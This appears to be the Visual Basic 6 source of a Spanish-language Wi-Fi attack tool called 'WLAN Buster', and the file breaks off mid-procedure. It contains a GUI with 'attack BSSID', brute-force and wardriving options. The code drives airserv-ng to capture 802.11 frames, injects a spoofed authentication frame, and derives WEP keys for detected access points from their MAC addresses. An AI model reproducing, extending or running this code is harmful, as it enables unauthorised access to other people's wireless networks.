VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frm_capturas 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "WLAN Buster"
   ClientHeight    =   7545
   ClientLeft      =   3720
   ClientTop       =   2685
   ClientWidth     =   11055
   Icon            =   "airserv.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7545
   ScaleWidth      =   11055
   Begin VB.OptionButton opt 
      BackColor       =   &H00FFFFFF&
      Caption         =   "13"
      Height          =   255
      Index           =   12
      Left            =   7200
      TabIndex        =   71
      Top             =   4440
      Width           =   495
   End
   Begin VB.CheckBox ch_can 
      Caption         =   "Check1"
      Height          =   195
      Index           =   12
      Left            =   7200
      TabIndex        =   70
      Top             =   4680
      Width           =   255
   End
   Begin VB.CommandButton pb_estudiar 
      Caption         =   "Estudiar BSSID"
      Height          =   255
      Left            =   9480
      TabIndex        =   69
      Top             =   4800
      Width           =   1455
   End
   Begin VB.CheckBox ch_wardrive 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Modo WarDriving"
      Height          =   255
      Left            =   7800
      TabIndex        =   68
      Top             =   6720
      Width           =   3135
   End
   Begin VB.CheckBox ch_brute 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Probar fuerza bruta "
      Height          =   255
      Left            =   7800
      TabIndex        =   66
      Top             =   6480
      Width           =   3135
   End
   Begin VB.CheckBox ch_noinv 
      BackColor       =   &H00FFFFFF&
      Caption         =   "No investigar BSSIDs resueltos"
      Height          =   255
      Left            =   7800
      TabIndex        =   65
      Top             =   6240
      Value           =   1  'Checked
      Width           =   3015
   End
   Begin VB.CheckBox ch_mngt 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Mostrar paquetes MNGT"
      Height          =   255
      Left            =   7800
      TabIndex        =   64
      Top             =   6000
      Width           =   2415
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Ver Claves WEP"
      Height          =   255
      Left            =   7800
      TabIndex        =   63
      Top             =   7080
      Width           =   1575
   End
   Begin VB.CommandButton pb_grabar 
      Caption         =   "Grabar Datos"
      Height          =   255
      Left            =   7800
      TabIndex        =   61
      Top             =   5280
      Visible         =   0   'False
      Width           =   1575
   End
   Begin VB.CommandButton pb_atacar 
      Caption         =   "Atacar BSSID"
      Height          =   255
      Left            =   7800
      TabIndex        =   58
      Top             =   4800
      Width           =   1575
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Command3"
      Height          =   255
      Left            =   11160
      TabIndex        =   54
      Top             =   6120
      Width           =   1335
   End
   Begin VB.CommandButton Command6 
      Caption         =   "Command3"
      Height          =   255
      Left            =   11160
      TabIndex        =   53
      Top             =   5760
      Width           =   1335
   End
   Begin VB.ListBox lst_datosatac 
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3210
      Left            =   9840
      TabIndex        =   49
      Top             =   360
      Width           =   1095
   End
   Begin VB.ListBox lst_datos 
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3210
      Left            =   8520
      TabIndex        =   48
      Top             =   360
      Width           =   1215
   End
   Begin VB.ListBox lst_balizas 
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3210
      Left            =   7200
      TabIndex        =   47
      Top             =   360
      Width           =   1215
   End
   Begin VB.CommandButton pb_salir 
      Caption         =   "Salir"
      Height          =   255
      Left            =   9480
      TabIndex        =   46
      Top             =   7080
      Width           =   1455
   End
   Begin VB.ListBox lst_paquetes 
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2370
      Left            =   240
      TabIndex        =   45
      Top             =   5040
      Width           =   7455
   End
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   11160
      Top             =   3240
   End
   Begin VB.CheckBox ch_auto 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Auto"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Left            =   240
      TabIndex        =   40
      Top             =   4680
      Width           =   975
   End
   Begin VB.CheckBox ch_can 
      Caption         =   "Check1"
      Height          =   195
      Index           =   11
      Left            =   6600
      TabIndex        =   39
      Top             =   4680
      Width           =   255
   End
   Begin VB.CheckBox ch_can 
      Caption         =   "Check1"
      Height          =   195
      Index           =   10
      Left            =   6120
      TabIndex        =   38
      Top             =   4680
      Width           =   255
   End
   Begin VB.CheckBox ch_can 
      Caption         =   "Check1"
      Height          =   195
      Index           =   9
      Left            =   5640
      TabIndex        =   37
      Top             =   4680
      Width           =   255
   End
   Begin VB.CheckBox ch_can 
      Caption         =   "Check1"
      Height          =   195
      Index           =   8
      Left            =   5160
      TabIndex        =   36
      Top             =   4680
      Value           =   1  'Checked
      Width           =   255
   End
   Begin VB.CheckBox ch_can 
      Caption         =   "Check1"
      Height          =   195
      Index           =   7
      Left            =   4680
      TabIndex        =   35
      Top             =   4680
      Width           =   255
   End
   Begin VB.CheckBox ch_can 
      Caption         =   "Check1"
      Height          =   195
      Index           =   6
      Left            =   4200
      TabIndex        =   34
      Top             =   4680
      Width           =   255
   End
   Begin VB.CheckBox ch_can 
      Caption         =   "Check1"
      Height          =   195
      Index           =   5
      Left            =   3720
      TabIndex        =   33
      Top             =   4680
      Value           =   1  'Checked
      Width           =   255
   End
   Begin VB.CheckBox ch_can 
      Caption         =   "Check1"
      Height          =   195
      Index           =   4
      Left            =   3240
      TabIndex        =   32
      Top             =   4680
      Width           =   255
   End
   Begin VB.CheckBox ch_can 
      Caption         =   "Check1"
      Height          =   195
      Index           =   3
      Left            =   2760
      TabIndex        =   31
      Top             =   4680
      Width           =   255
   End
   Begin VB.CheckBox ch_can 
      Caption         =   "Check1"
      Height          =   195
      Index           =   2
      Left            =   2280
      TabIndex        =   30
      Top             =   4680
      Value           =   1  'Checked
      Width           =   255
   End
   Begin VB.CheckBox ch_can 
      Caption         =   "Check1"
      Height          =   195
      Index           =   1
      Left            =   1800
      TabIndex        =   29
      Top             =   4680
      Width           =   255
   End
   Begin VB.CheckBox ch_can 
      Caption         =   "Check1"
      Height          =   195
      Index           =   0
      Left            =   1320
      TabIndex        =   28
      Top             =   4680
      Width           =   255
   End
   Begin VB.OptionButton opt 
      BackColor       =   &H00FFFFFF&
      Caption         =   "12"
      Height          =   255
      Index           =   11
      Left            =   6600
      TabIndex        =   27
      Top             =   4440
      Width           =   495
   End
   Begin VB.OptionButton opt 
      BackColor       =   &H00FFFFFF&
      Caption         =   "11"
      Height          =   255
      Index           =   10
      Left            =   6120
      TabIndex        =   26
      Top             =   4440
      Width           =   495
   End
   Begin VB.OptionButton opt 
      BackColor       =   &H00FFFFFF&
      Caption         =   "10"
      Height          =   255
      Index           =   9
      Left            =   5640
      TabIndex        =   25
      Top             =   4440
      Width           =   495
   End
   Begin VB.OptionButton opt 
      BackColor       =   &H00FFFFFF&
      Caption         =   "9"
      Height          =   255
      Index           =   8
      Left            =   5160
      TabIndex        =   24
      Top             =   4440
      Width           =   495
   End
   Begin VB.OptionButton opt 
      BackColor       =   &H00FFFFFF&
      Caption         =   "8"
      Height          =   255
      Index           =   7
      Left            =   4680
      TabIndex        =   23
      Top             =   4440
      Width           =   495
   End
   Begin VB.OptionButton opt 
      BackColor       =   &H00FFFFFF&
      Caption         =   "7"
      Height          =   255
      Index           =   6
      Left            =   4200
      TabIndex        =   22
      Top             =   4440
      Width           =   495
   End
   Begin VB.OptionButton opt 
      BackColor       =   &H00FFFFFF&
      Caption         =   "6"
      Height          =   255
      Index           =   5
      Left            =   3720
      TabIndex        =   21
      Top             =   4440
      Width           =   495
   End
   Begin VB.OptionButton opt 
      BackColor       =   &H00FFFFFF&
      Caption         =   "5"
      Height          =   255
      Index           =   4
      Left            =   3240
      TabIndex        =   20
      Top             =   4440
      Width           =   495
   End
   Begin VB.OptionButton opt 
      BackColor       =   &H00FFFFFF&
      Caption         =   "4"
      Height          =   255
      Index           =   3
      Left            =   2760
      TabIndex        =   19
      Top             =   4440
      Width           =   495
   End
   Begin VB.OptionButton opt 
      BackColor       =   &H00FFFFFF&
      Caption         =   "3"
      Height          =   255
      Index           =   2
      Left            =   2280
      TabIndex        =   18
      Top             =   4440
      Width           =   495
   End
   Begin VB.OptionButton opt 
      BackColor       =   &H00FFFFFF&
      Caption         =   "2"
      Height          =   255
      Index           =   1
      Left            =   1800
      TabIndex        =   17
      Top             =   4440
      Width           =   495
   End
   Begin VB.OptionButton opt 
      BackColor       =   &H00FFFFFF&
      Caption         =   "1"
      Height          =   255
      Index           =   0
      Left            =   1320
      TabIndex        =   16
      Top             =   4440
      Value           =   -1  'True
      Width           =   495
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Command3"
      Height          =   255
      Left            =   11160
      TabIndex        =   14
      Top             =   5400
      Width           =   1335
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Command2"
      Height          =   255
      Left            =   11160
      TabIndex        =   13
      Top             =   4200
      Width           =   1695
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Command1"
      Height          =   375
      Left            =   11160
      TabIndex        =   12
      Top             =   3720
      Width           =   1695
   End
   Begin VB.ListBox lst_claves 
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3210
      Left            =   1800
      TabIndex        =   4
      Top             =   360
      Width           =   2415
   End
   Begin VB.ListBox lst_essid 
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3210
      Left            =   240
      TabIndex        =   3
      Top             =   360
      Width           =   1455
   End
   Begin VB.ListBox lst_bssid 
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3210
      Left            =   4440
      TabIndex        =   0
      Top             =   360
      Width           =   2655
   End
   Begin MSWinsockLib.Winsock ws02 
      Left            =   11160
      Top             =   2640
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "(Doble-Click para seleccionar)"
      BeginProperty Font 
         Name            =   "Arial Narrow"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   6
      Left            =   5160
      TabIndex        =   67
      Top             =   120
      Width           =   1935
   End
   Begin VB.Label l_grabando 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Grabando datos de BSSID seleccionado"
      ForeColor       =   &H007A4075&
      Height          =   255
      Left            =   7800
      TabIndex        =   62
      Top             =   5640
      Visible         =   0   'False
      Width           =   3135
   End
   Begin VB.Label l_tps 
      Alignment       =   1  'Right Justify
      BackColor       =   &H00FFFFFF&
      Caption         =   "0"
      Height          =   255
      Left            =   6120
      TabIndex        =   60
      Top             =   4080
      Width           =   975
   End
   Begin VB.Label Label2 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Tramas / Segundo:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   6
      Left            =   4440
      TabIndex        =   59
      Top             =   4080
      Width           =   1935
   End
   Begin VB.Label l_essidataque 
      BackColor       =   &H00FFFFFF&
      Caption         =   "ESSID Ataque:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Left            =   7800
      TabIndex        =   57
      Top             =   4440
      Width           =   3135
   End
   Begin VB.Label l_macataque 
      BackColor       =   &H00FFFFFF&
      Caption         =   "MAC Ataque:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Left            =   7800
      TabIndex        =   56
      Top             =   4080
      Width           =   3135
   End
   Begin VB.Label l_maclocal 
      BackColor       =   &H00FFFFFF&
      Caption         =   "MAC Tarjeta:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Left            =   7800
      TabIndex        =   55
      Top             =   3720
      Width           =   3135
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Atacables"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   5
      Left            =   9840
      TabIndex        =   52
      Top             =   120
      Width           =   975
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Datos"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   4
      Left            =   8520
      TabIndex        =   51
      Top             =   120
      Width           =   615
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Balizas"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   3
      Left            =   7200
      TabIndex        =   50
      Top             =   120
      Width           =   615
   End
   Begin VB.Label l_buffer 
      Alignment       =   1  'Right Justify
      BackColor       =   &H00FFFFFF&
      Caption         =   "0"
      Height          =   255
      Left            =   6120
      TabIndex        =   44
      Top             =   3720
      Width           =   975
   End
   Begin VB.Label Label2 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Tramas Analizadas:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   5
      Left            =   4440
      TabIndex        =   43
      Top             =   3720
      Width           =   1935
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "BSSID"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   2
      Left            =   4440
      TabIndex        =   42
      Top             =   120
      Width           =   615
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Claves"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   1
      Left            =   1800
      TabIndex        =   41
      Top             =   120
      Width           =   1575
   End
   Begin VB.Label Label2 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Canal Activ:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   4
      Left            =   240
      TabIndex        =   15
      Top             =   4440
      Width           =   1215
   End
   Begin VB.Label l_datos 
      Alignment       =   1  'Right Justify
      BackColor       =   &H00FFFFFF&
      Caption         =   "0"
      Height          =   255
      Left            =   3600
      TabIndex        =   11
      Top             =   3720
      Width           =   615
   End
   Begin VB.Label Label2 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Datos"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   3
      Left            =   2520
      TabIndex        =   10
      Top             =   3720
      Width           =   1215
   End
   Begin VB.Label Label2 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Datos Atacables"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   2
      Left            =   2520
      TabIndex        =   9
      Top             =   4080
      Width           =   1455
   End
   Begin VB.Label l_datoswlan 
      Alignment       =   1  'Right Justify
      BackColor       =   &H00FFFFFF&
      Caption         =   "0"
      Height          =   255
      Left            =   3600
      TabIndex        =   8
      Top             =   4080
      Width           =   615
   End
   Begin VB.Label l_beacons 
      Alignment       =   1  'Right Justify
      BackColor       =   &H00FFFFFF&
      Caption         =   "0"
      Height          =   255
      Left            =   1320
      TabIndex        =   7
      Top             =   3720
      Width           =   735
   End
   Begin VB.Label Label2 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Balizas"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   1
      Left            =   240
      TabIndex        =   6
      Top             =   3720
      Width           =   975
   End
   Begin VB.Label Label2 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Balizas WLAN"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   0
      Left            =   240
      TabIndex        =   5
      Top             =   4080
      Width           =   1335
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Punto Acceso"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   0
      Left            =   240
      TabIndex        =   2
      Top             =   120
      Width           =   1575
   End
   Begin VB.Label l_beaconswlan 
      Alignment       =   1  'Right Justify
      BackColor       =   &H00FFFFFF&
      Caption         =   "0"
      Height          =   255
      Left            =   1320
      TabIndex        =   1
      Top             =   4080
      Width           =   735
   End
End
Attribute VB_Name = "frm_capturas"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim f As Integer
Dim i_ch As Integer
Dim sesion As String
Dim maclocal As String
Dim macataque As String
Dim paso As Integer
Dim Ttps As Long
Dim Ntps As Long
Dim sClave As String

Private Sub CierraAirserv()
   Dim sTitle As String
   Dim iHwnd As Long
   Dim ihTask As Long
   Dim iReturn As Long
   Dim T As Long
   AppActivate App.Path & "\airserv-ng.exe"
   DoEvents
   SendKeys "^C"
   sTitle = App.Path & "\airserv-ng.exe"
   iHwnd = FindWindow(0&, sTitle)
   iReturn = CloseWindow(iHwnd)
   iReturn = DestroyWindow(iHwnd)
   T = GetTickCount()
   Do While (GetTickCount() - T) < 1000
      DoEvents
   Loop
End Sub

Private Sub HabilitaCanal(ByVal Canal As Integer)
    On Error Resume Next
    gCANAL = Canal
    ws02.SendData Chr$(3) & Chr$(0) & Chr$(0) & Chr$(0) & Chr$(4) & Chr$(0) & Chr$(0) & Chr$(0) & Chr$(Canal)
    ws02.SendData Chr$(8) & Chr$(0) & Chr$(0) & Chr$(0) & Chr$(0)
    If Err > 0 Then
       If Not Conecta() Then
          MsgBox "No es posible comunicar con airserv-ng"
          End
       End If
       HabilitaCanal Canal
    End If
End Sub

Private Sub Command3_Click()
    paso = 1
    traza = Chr$(7) & Chr$(0) & Chr$(0) & Chr$(0) & Chr$(6)
    ws02.SendData Chr$(6) & Chr$(0) & Chr$(0) & Chr$(0) & Chr$(0)
End Sub

Private Sub Command4_Click()
    On Error Resume Next
    ws02.Close
    frm_envio.Show
    If Not Conecta() Then
       MsgBox "No se puede conectar"
    End If
End Sub

Private Sub Command6_Click()
    Dim a As String
    a = Chr$(4) & Chr$(0) & Chr$(0) & Chr$(0) & Chr$(&H22)
    a = a & Chr$(0) & Chr$(0) & Chr$(0) & Chr$(0)
    a = a & Chr$(&HB0) & Chr$(0) & Chr$(&H3A) & Chr$(1)
    a = a & macataque & maclocal & macataque
    a = a & Chr$(0) & Chr$(0) & Chr$(0) & Chr$(0)
    a = a & Chr$(1) & Chr$(0) & Chr$(0) & Chr$(0)
    ws02.SendData a
End Sub

Private Sub Form_Activate()
  ' Espera 3000
  ' CierraAirodump
  Dim n As Integer
  'opt(5).Value = True
   If ws02.State = 7 Then Exit Sub
   If Not Conecta() Then
      MsgBox "No se puede conectar"
   End If

End Sub

Private Sub Form_Load()
   Randomize Timer
   Me.Caption = Me.Caption & " V" & Mid$(Version, 1, 1) & "." & Mid$(Version, 2, 1) & "." & Mid$(Version, 3, 1)
   RefrescaRelBSSIDs
   'f = FreeFile
   'Open App.Path & "\captura.cap" For Binary Access Read Write As #f
   If Not Conecta() Then
      MsgBox "No se puede conectar"
   End If
   opt(5).Value = True
   HabilitaCanal 6
   sesion = Format$(Now, "yyyymmddhhmmss")
End Sub

Private Sub Form_Unload(Cancel As Integer)
   On Error Resume Next
   Close (f)
   frm_pres.Show
End Sub

Private Sub lst_bssid_DblClick()
    l_macataque.Caption = "MAC Ataque: " & lst_bssid.Text
    gBSSID = lst_bssid.Text
    l_essidataque.Caption = "ESSID Ataque: " & lst_essid.List(lst_bssid.ListIndex)
    gESSID = lst_essid.List(lst_bssid.ListIndex)
    macataque = HexaASCII(Replace(lst_bssid.Text, ":", ""))
End Sub

Private Sub opt_Click(Index As Integer)
    HabilitaCanal Index + 1
End Sub

Private Sub pb_atacar_Click()
   If l_macataque.Caption = "MAC Ataque:" Then Exit Sub
      
      
   ws02.Close
   frm_assoc.Show vbModal
End Sub

Private Sub pb_exam_Click()
   frm_tablon.Show
   Unload Me
End Sub

Private Sub pb_estudiar_Click()
   If l_macataque.Caption = "MAC Ataque:" Then Exit Sub
   ws02.Close
   frm_watcher.Show vbModal
End Sub

Private Sub pb_grabar_Click()
   AbrirCAP gESSID & "_" & Format$(Now, "yyyymmddhhmmss")
   l_grabando.Visible = True
End Sub

Private Sub pb_salir_Click()
   frm_pres.Show
   Unload Me
End Sub
Private Function Conecta() As Boolean
   Dim T As Long
   T = GetTickCount()
   ws02.Close
   ws02.RemoteHost = "127.0.0.1"
   ws02.RemotePort = 666
   ws02.Connect
   Do While ((GetTickCount() - T) < 3000) And ws02.State <> 7
      DoEvents
   Loop
   If ws02.State = 7 Then
      Conecta = True
   End If

End Function
Private Sub Timer1_Timer()
    Static secs As Integer
    On Error Resume Next
    If maclocal = "" Then ws02.SendData Chr$(6) & Chr$(0) & Chr$(0) & Chr$(0) & Chr$(0)
    If secs Mod 5 = 0 And ch_wardrive.Value = 1 Then
       WardriveClean
    End If
    If ch_auto.Value = 0 Then Exit Sub
    secs = secs + 1
    If secs = 10 Then
       secs = 0
       SubeCanal
    End If
End Sub
Private Sub WardriveClean()
    Dim n As Integer
    For n = lst_bssid.ListCount - 1 To 0 Step -1
        If GetTickCount() - lst_bssid.ItemData(n) > 4500 Then
           lst_bssid.RemoveItem n
           lst_essid.RemoveItem n
           lst_claves.RemoveItem n
           lst_balizas.RemoveItem n
           lst_datos.RemoveItem n
           lst_datosatac.RemoveItem n
        End If
    Next n
End Sub
Private Sub SubeCanal()
    Static Ultimo As Integer
    For n = Ultimo To 11
        If ch_can(n).Value = 1 Then
           opt(n).Value = True
           Ultimo = n + 1
           Exit Sub
        End If
    Next n
    For n = 0 To Ultimo
        If ch_can(n).Value = 1 Then
           opt(n).Value = True
           Ultimo = n + 1
           Exit Sub
        End If
    Next n
    
End Sub
Private Sub ws02_DataArrival(ByVal bytesTotal As Long)
   Dim a As String
   On Error Resume Next
   ws02.GetData a
   If Err > 0 Then
      If Not Conecta() Then
         MsgBox "Se ha perdido la conexión con Airserv-NG"
         Unload Me
      End If
   End If
   'Put #f, , a
   Procesa a
End Sub

Private Sub Procesa(ByVal a As String)
   Dim n As Long
   Dim P As String
   Static b As String
   Dim header As String
   Dim Payload As String
   Dim lpayload As Long
   b = b & a
   Do
       header = Left$(b, 5)
       If Len(header) < 5 Then Exit Do
       lpayload = Asc(Mid$(b, 5, 1)) + (256 * Asc(Mid$(b, 4, 1)))
       Payload = Mid$(b, 6, lpayload)
       b = Mid$(b, lpayload + 5 + 1)
               
       ProcesaPaquete header, Payload
       
       DoEvents
   Loop
End Sub
Private Function BSSID_a_ESSID(ByVal bssid As String) As String
   Dim j As Integer
   If InStr(bssid, ":") = 0 Then bssid = MAC(bssid)
   For j = 0 To lst_bssid.ListCount - 1
       If lst_bssid.List(j) = bssid Then
          BSSID_a_ESSID = lst_essid.List(j)
          Exit Function
       End If
   Next j
End Function
Private Function IndiceBSSID(ByVal bssid As String) As Integer
   Dim j As Integer
   For j = 0 To lst_bssid.ListCount - 1
       If lst_bssid.List(j) = bssid Then
          IndiceBSSID = j
          Exit Function
       End If
   Next j
   IndiceBSSID = -1
End Function
Private Function PonClave(ByVal bssid As String, ByVal MAC As String) As Integer
   Dim n As Integer
   PonClave = -1
   l_datoswlan.Caption = Val(l_datoswlan.Caption) + 1
   l_datoswlan.Refresh
   
   For n = 0 To lst_bssid.ListCount - 1
       If lst_bssid.List(n) = bssid Then
          lst_datosatac.List(n) = lst_datosatac.List(n) + 1
          If Right$(lst_claves.List(n), 1) = "?" Then
             sClave = clave(MAC)
             lst_claves.List(n) = sClave
             PonClave = n
             'Debug.Print n, clave(MAC)
          Else
             PonClave = -2
          End If
          lst_claves.Selected(n) = True
          Exit Function
       End If
   Next n
End Function
Private Sub ProcesaBeacon(ByVal ESSID As String, ByVal bssid As String)
   Dim n As Integer
   If ch_noinv.Value = 1 And InStr(RelBSSIDs, "|" & bssid & "|") > 0 Then
      Exit Sub
   End If
   l_beaconswlan.Caption = Val(l_beaconswlan.Caption) + 1
   l_beaconswlan.Refresh
   For n = 0 To lst_bssid.ListCount - 1
       If lst_bssid.List(n) = bssid Then
          lst_bssid.ItemData(n) = GetTickCount()
          lst_essid.Selected(n) = True
          lst_balizas.List(n) = lst_balizas.List(n) + 1
          Exit Sub
       End If
   Next n
   lst_bssid.AddItem bssid
   lst_bssid.ItemData(lst_bssid.ListCount - 1) = GetTickCount()
   lst_essid.AddItem ESSID
   lst_claves.AddItem IIf(InStr(RelBSSIDs, "|" & bssid & "|") > 0, LeeWEP(bssid), "?")
   lst_balizas.AddItem "1"
   lst_datos.AddItem "0"
   lst_datosatac.AddItem "0"
   
End Sub

Private Sub ProcesaPaquete(ByVal HDR As String, ByVal PLD As String)
   Dim q As String
   Dim n As Integer
   Dim i As Integer
   Dim smac As String
   Dim dmac As String
   Dim bssid As String
   Dim ESSID As String
   Dim pType As String
   Dim ff As Long
   Dim nuevaclave As Integer
   Dim c As String
   Dim ib As Integer
   Dim traza As String
   Dim it As Long
   Dim T As String
   Dim clavefb As String
   
   Static np As Long
   Dim pwr As Integer
   Dim frmctr As TPE_FrameControl
   Dim pckdMAC As String
   Dim pcksMAC As String
   Dim pckBSSID As String

   np = np + 1
   pwr = Asc(Left$(PLD, 1))
   ActuTramas
   Select Case Asc(Left$(HDR, 1))
      Case 7 'Respuesta a petición de MAC Local
         maclocal = PLD
         l_maclocal.Caption = "MAC Tarjeta: " & MAC(maclocal)
         gMACLocal = MAC(maclocal)
      Case 5 'Paquete
         PLD = Mid$(PLD, 29)
         SetFrameControl Left$(PLD, 2), frmctr
         If frmctr.ToDS = False And frmctr.FromDS = False Then
            pckdMAC = Mid$(PLD, 5, 6)
            pcksMAC = Mid$(PLD, 11, 6)
            pckBSSID = Mid$(PLD, 17, 6)
